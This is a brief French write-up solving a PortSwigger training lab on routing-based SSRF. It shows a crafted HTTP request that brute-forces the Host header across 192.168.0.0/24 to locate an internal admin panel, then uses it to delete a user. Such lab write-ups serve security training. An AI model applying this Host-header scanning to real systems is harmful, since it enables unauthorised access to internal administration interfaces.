# Lab

https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf

## Solution

Via la description du lab, on sait qu'il y a un panel admin localisé sur le réseau interne quelque part sur la plage d'ip `192.168.0.0/24`.

On peut donc essayer de scanner cette plage d'ip pour trouver le panel admin en injectant des adresses ip dans le header `Host` de la requête.

```http
GET / HTTP/2
Host: 192.168.0.§§
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

En lancant un intruder qui remplace les `§§` par des nombres de 0 à 255, on peut voir que l'ip `192.168.0.66` est valide et répond avec un code `302` :

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

On peut donc accéder au panel admin via l'url `/admin` et supprimer l'utilisateur `carlos` pour valider le lab, tout en remplacant le header `Host` de la requête avec l'ip `192.168.0.66`.